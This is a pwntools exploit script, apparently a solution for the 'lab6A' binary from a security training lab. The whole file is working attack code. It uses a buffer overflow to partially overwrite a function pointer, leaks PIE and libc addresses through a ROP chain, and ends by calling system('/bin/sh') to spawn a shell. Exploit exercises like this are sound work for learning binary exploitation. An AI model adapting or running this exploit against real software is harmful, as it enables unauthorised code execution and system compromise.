from pwn import *
chall = ELF("./lab6A")
libc = ELF("./libc.so.6")

print(hex(chall.symbols["print_listing"]))
print(hex(chall.symbols["print_name"]))
def change_pointer(lmao : bytes):
    s.sendlineafter(b"Enter Choice: ", b"1")
    name = b"b" * 32
    s.sendafter(b"Enter your name: ", name)
    desc = b"a" * (128 - 6 - 32) + lmao
    s.sendafter(b"Enter your description: ", desc)
def reset_name():
    s.sendlineafter(b"Enter Choice: ", b"1")
    name = b"\x00" *32 #+ b"\x00" * 31
    s.sendafter(b"Enter your name: ", name)
    s.sendafter(b"Enter your description: ", b"\x00" * (128 - 6))
    s.sendlineafter(b"Enter Choice: ", b"1")
    name = b"a"*(32 - 6) + b"\x00" * 6
    s.sendafter(b"Enter your name: ", name)
    s.sendafter(b"Enter your description: ", b"\x00" * (128 - 32))

gdbscripter = '''
break *main+398
break *make_note+43
'''
while True:
    s = process(["./lab6A"])
    change_pointer(b"\xe2\x5b")

    s.sendlineafter(b"Enter Choice: ", b"3")
    try:
        s.recvuntil(b"Username: ")
    except:
        print("Failed!")
        s.close()
        continue
    #gdb.attach(s, gdbscript = gdbscripter)
    print("Successfully change!")
    s.recvuntil(b"a" * (128 - 6 - 32))
    addr = s.recv(4)
    addr = int.from_bytes(addr, "little")
    print("Leak address:", hex(addr))
    PIE_base = addr - chall.symbols["print_name"]
    print("Base address:" ,hex(PIE_base))
    make_note = p32(PIE_base + chall.symbols["make_note"])

    reset_name()
    #change_pointer(make_note + b"\x00")
    s.sendlineafter(b"Enter Choice: ", b"1")
    s.sendafter(b"Enter your name: ", b"a" * 26)
    s.sendafter(b"Enter your description: ", b"a" * (128 - 32) + make_note)
    #now choice 3 become gets
    s.sendlineafter(b"Enter Choice: ", b"3")
    puts_plt = p32(PIE_base + chall.plt["puts"])
    puts_got = p32(PIE_base + chall.got["puts"])
    #s.interactive()
    pop_ebx = p32(PIE_base + 0x00000655)
    payload = b"a" * 0x30 + b"bbbb" + pop_ebx + p32(PIE_base + chall.got["puts"] - 0x2c) + puts_plt + make_note + puts_got
    s.sendlineafter(b"Make a Note About your listing...: ", payload)
    leak = int.from_bytes(s.recv(4), "little")
    libc_base = leak - libc.symbols["puts"]
    print("leak libc base:", hex(libc_base))
    binsh = p32(list(libc.search(b"/bin/sh"))[0] + libc_base)
    system = p32(libc.symbols["system"] + libc_base)
    payload = b"a" * 0x30 + b"bbbb" + system + b"cccc" + binsh
    print(payload)
    s.sendlineafter(b"Make a Note About your listing...: ", payload)
    s.sendline(b"id") 
    
    s.interactive()
    
